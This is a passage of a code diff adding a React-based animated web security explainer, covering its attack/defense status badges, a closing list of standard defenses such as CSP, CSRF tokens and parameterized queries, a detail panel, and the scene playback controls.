+    e("div", { style:{ fontSize:11, color:T.text3, minHeight:40 } }, "No active attack or defense")
+  );
+  const isAttack = !!attack;
+  return e(M.div, {
+    onClick,
+    animate:{ borderColor:T.border2, boxShadow:"none" },
+    transition:{ duration:0.4 },
+    style:{ borderRadius:12, border:"1.5px solid", background:T.surface, overflow:"hidden", cursor:"pointer" }
+  },
+    e("div", { style:{ padding:"8px 13px", borderBottom:`1px solid ${T.border}` } },
+      e("span", { style:{ fontSize:10, fontWeight:600, letterSpacing:"0.06em", color:T.text2 } }, isAttack ? "Attack Vector" : "Defense")
+    ),
+    e("div", { style:{ padding:12, display:"flex", alignItems:"center", gap:10, minHeight:52 } },
+      e(M.div, {
+        animate:{ scale:[1,1.1,1] },
+        transition:{ duration:1.5, repeat:Infinity },
+        style:{ width:32, height:32, borderRadius:"50%", border:`1.5px solid ${item.color}66`, background:`${item.color}18`, display:"flex", alignItems:"center", justifyContent:"center", fontSize:16 }
+      }, isAttack ? "\u26A0" : "\u2705"),
+      e(AP, { mode:"wait" },
+        e(M.div, { key:item.label, initial:{opacity:0,x:8}, animate:{opacity:1,x:0}, exit:{opacity:0}, transition:ez },
+          e("div", { style:{ fontSize:13, fontWeight:600, color:item.color, marginBottom:2 } }, item.label),
+          e("div", { style:{ fontSize:10, color:T.text2 } }, isAttack ? "Active threat" : "Protection enabled")
+        )
+      )
+    )
+  );
+};
+
+const Finale = () => {
+  const rows = [
+    { n:1, label:"Input Validation & Output Encoding", sub:"Escape user data for the correct context (HTML, JS, SQL, URL). Never trust client input.", c:T.red },
+    { n:2, label:"Content Security Policy", sub:"Restrict script sources. Block inline scripts and eval(). Report violations.", c:T.coral },
+    { n:3, label:"CSRF Tokens + SameSite Cookies", sub:"Ensure requests originate from your own forms. Use SameSite=Strict or Lax.", c:T.amber },
+    { n:4, label:"Parameterized Queries", sub:"Never concatenate user input into SQL. Use prepared statements or ORM methods.", c:T.pink },
+    { n:5, label:"HTTPS Everywhere", sub:"Encrypt all traffic with TLS. Use HSTS to prevent downgrade attacks.", c:T.green },
+    { n:6, label:"Secure Cookie Flags", sub:"HttpOnly (no JS access), Secure (HTTPS only), SameSite (cross-site protection).", c:T.blue },
+    { n:7, label:"X-Frame-Options", sub:"Prevent clickjacking with frame-ancestors 'none' or X-Frame-Options: DENY.", c:T.teal },
+    { n:"\u21B3", label:"Defense in Depth", sub:"No single measure is enough. Layer protections across every boundary.", c:T.purple },
+  ];
+  return e("div", { style:{ padding:"8px 0" } },
+    rows.map((r,i) => e(M.div, { key:i, initial:{opacity:0,x:-20}, animate:{opacity:1,x:0}, transition:{delay:i*0.1,...ez},
+      style:{ display:"flex", alignItems:"flex-start", gap:12, padding:"9px 14px", marginBottom:6, borderRadius:10, border:`1px solid ${r.c}28`, background:`${r.c}08` }
+    },
+      e("div", { style:{ width:24, height:24, borderRadius:"50%", border:`1.5px solid ${r.c}`, display:"flex", alignItems:"center", justifyContent:"center", flexShrink:0, fontSize:11, fontWeight:700, color:r.c } }, r.n),
+      e("div", null,
+        e("div", { style:{ fontSize:12, fontWeight:600, color:r.c, marginBottom:2 } }, r.label),
+        e("div", { style:{ fontSize:10, color:T.text2, lineHeight:1.5 } }, r.sub)
+      )
+    ))
+  );
+};
+
+const DetailPanel = ({ detailKey, onClose }) => {
+  const d = DETAILS[detailKey];
+  if (!d) return null;
+  return e("div", {
+    style:{ width:340, flexShrink:0, background:T.surface, borderRadius:14, border:`1.5px solid ${d.color}44`, overflow:"hidden", alignSelf:"flex-start", position:"sticky", top:56 }
+  },
+    e("div", { style:{ padding:"14px 18px 12px", borderBottom:`1px solid ${T.border}`, display:"flex", alignItems:"center", justifyContent:"space-between" } },
+      e("div", { style:{ display:"flex", alignItems:"center", gap:8 } },
+        e("div", { style:{ width:8, height:8, borderRadius:"50%", background:d.color } }),
+        e("span", { style:{ fontSize:14, fontWeight:600, color:T.text1 } }, d.title)
+      ),
+      e("button", { onClick:onClose, style:{ background:"none", border:"none", color:T.text3, cursor:"pointer", fontSize:16, padding:"2px 6px", borderRadius:6, transition:"color 0.2s" }, onMouseEnter:ev=>ev.target.style.color=T.text1, onMouseLeave:ev=>ev.target.style.color=T.text3 }, "\u2715")
+    ),
+    e("div", { style:{ padding:"16px 18px 20px", maxHeight:"calc(100vh - 140px)", overflowY:"auto" } },
+      d.sections.map((s, i) =>
+        e("div", { key:i, style:{ marginBottom: i < d.sections.length-1 ? 18 : 0 } },
+          e("div", { style:{ fontSize:11, fontWeight:700, color:d.color, letterSpacing:"0.04em", marginBottom:5, textTransform:"uppercase" } }, s.heading),
+          e("div", { style:{ fontSize:12, color:T.text2, lineHeight:1.7, whiteSpace:"pre-wrap" } }, s.body)
+        )
+      )
+    )
+  );
+};
+
+/* ─── APP ─── */
+function App() {
+  const [si, setSi] = useState(0);
+  const [playing, setPlaying] = useState(false);
+  const [detail, setDetail] = useState(null);
+  const timer = useRef(null);
+  const sc = SCENES[si];
+
+  useEffect(() => { setPlaying(true); }, []);
+
+  useEffect(() => {
+    if (!playing) return;
+    const d = si===0 ? 3500 : sc.finale ? 99999 : 4000;
+    timer.current = setTimeout(() => { si < SCENES.length-1 ? setSi(i=>i+1) : setPlaying(false); }, d);
+    return () => clearTimeout(timer.current);
+  }, [playing, si]);
+
+  const go = d => { clearTimeout(timer.current); setPlaying(false); setSi(i=>Math.max(0,Math.min(SCENES.length-1,i+d))); };
+  const jump = i => { clearTimeout(timer.current); setPlaying(false); setSi(i); };
+  const togglePlay = () => { if(si===SCENES.length-1){setSi(0);setPlaying(true);}else setPlaying(p=>!p); };
+  const toggleDetail = key => { setDetail(d => d===key ? null : key); clearTimeout(timer.current); setPlaying(false); };
+
+  return e("div", { style:{ display:"flex", gap:16, alignItems:"flex-start", justifyContent: detail ? "flex-start" : "center" } },
+  e("div", { style:{ width:760, flexShrink:0, background:T.bg, fontFamily:"system-ui,sans-serif", padding:20, borderRadius:16 } },
+
+    /* header */
+    e("div", { style:{ marginBottom:18 } },
+      e("div", { style:{ display:"flex", alignItems:"center", gap:10, marginBottom:11 } },
+        e(AP, { mode:"wait" },
+          e(M.div, { key:sc.act, initial:{opacity:0,scale:0.8}, animate:{opacity:1,scale:1}, exit:{opacity:0}, transition:sp(400,28),
+            style:{ fontSize:9,fontWeight:700,letterSpacing:"0.14em",textTransform:"uppercase",color:T.purple,background:`${T.purple}14`,padding:"3px 10px",borderRadius:20,border:`1px solid ${T.purple}30`,flexShrink:0 }
+          }, sc.act)
+        ),
+        e("div", { style:{ flex:1, height:1, background:T.border, borderRadius:99, overflow:"hidden" } },
+          e(M.div, { animate:{width:`${si/(SCENES.length-1)*100}%`}, transition:{duration:0.5}, style:{height:"100%",background:T.purple,borderRadius:99} })
+        ),
+        e("span", { style:{ fontSize:10, color:T.text3 } }, `${si+1} / ${SCENES.length}`)
+      ),
+      e(AP, { mode:"wait" },
+        e(M.div, { key:sc.title, initial:{opacity:0,y:8}, animate:{opacity:1,y:0}, exit:{opacity:0,y:-8}, transition:ez,
+          style:{ fontSize:20,fontWeight:600,color:T.text1,marginBottom:4,letterSpacing:"-0.02em" }
+        }, sc.title)
+      ),
+      e(AP, { mode:"wait" },
+        e(M.div, { key:sc.sub, initial:{opacity:0}, animate:{opacity:1}, exit:{opacity:0}, transition:{duration:0.25},
+          style:{ fontSize:12, color:T.text2, lineHeight:1.65 }
+        }, sc.sub)
+      )
+    ),
+
+    e("div", { style:{ minHeight:460 } },
+    /* finale */
+    sc.finale && e(Finale),
+
+    /* main grid */
+    !sc.finale && e("div", null,
+
+      /* row 1: code + flow diagram */
+      e("div", { style:{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:10, marginBottom:10 } },
+        e("div", { onClick:()=>toggleDetail("code"), style:{cursor:"pointer"} },
+          e(CodePanel, { tokens: sc.code })
+        ),
+        e(FlowDiagram, { diagram:sc.diagram, focused:false, onClick:()=>toggleDetail("diagram") })
+      ),
+
+      /* row 2: attack/defense badge */
+      e("div", { style:{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:10 } },
+        e(StatusBadge, { attack:sc.attack, defense:null, onClick:()=>toggleDetail("attack") }),
+        e(StatusBadge, { attack:null, defense:sc.defense, onClick:()=>toggleDetail("defense") })
+      )
+    ),
+    ), /* close minHeight wrapper */
+
+    /* controls */
+    e("div", { style:{ display:"flex", alignItems:"center", gap:8, marginTop:16 } },
+      e("button", { onClick:()=>go(-1), disabled:si===0,
+        style:{ padding:"6px 14px",borderRadius:8,border:`1px solid ${T.border}`,background:"transparent",color:si===0?T.text3:T.text2,cursor:si===0?"not-allowed":"pointer",fontSize:11,transition:"color 0.2s" }
+      }, "\u2190 Back"),
+      e("button", { onClick:togglePlay,
+        style:{ padding:"6px 18px",borderRadius:8,border:`1px solid ${playing?T.coral:T.purple}44`,background:playing?`${T.coral}14`:`${T.purple}14`,color:playing?T.coralL:T.purpleL,cursor:"pointer",fontSize:12,fontWeight:600,transition:"all 0.2s" }
+      }, playing ? "\u23F8  Pause" : si===SCENES.length-1 ? "\u21BA  Replay" : "\u25B6  Play"),
+      e("button", { onClick:()=>go(1), disabled:si===SCENES.length-1,
+        style:{ padding:"6px 14px",borderRadius:8,border:`1px solid ${T.border}`,background:"transparent",color:si===SCENES.length-1?T.text3:T.text2,cursor:si===SCENES.length-1?"not-allowed":"pointer",fontSize:11 }
+      }, "Next \u2192"),
+      e("div", { style:{ flex:1 } }),
+      e("div", { style:{ display:"flex", gap:4, alignItems:"center" } },
+        SCENES.map((_,i) =>
+          e("button", { key:i, onClick:()=>jump(i),
+            style:{ width:i===si?16:5,height:5,borderRadius:99,border:"none",padding:0,background:i===si?T.purple:i<si?`${T.purple}55`:T.border,cursor:"pointer",transition:"all 0.25s" }
+          })
+        )
+      )
+    )
+  ),
+  detail && e(DetailPanel, { detailKey:detail, onClose:()=>setDetail(null) })
+  );
+}
+
+ReactDOM.createRoot(document.getElementById("root")).render(e(App));
+</script>
+</body>
+</html>
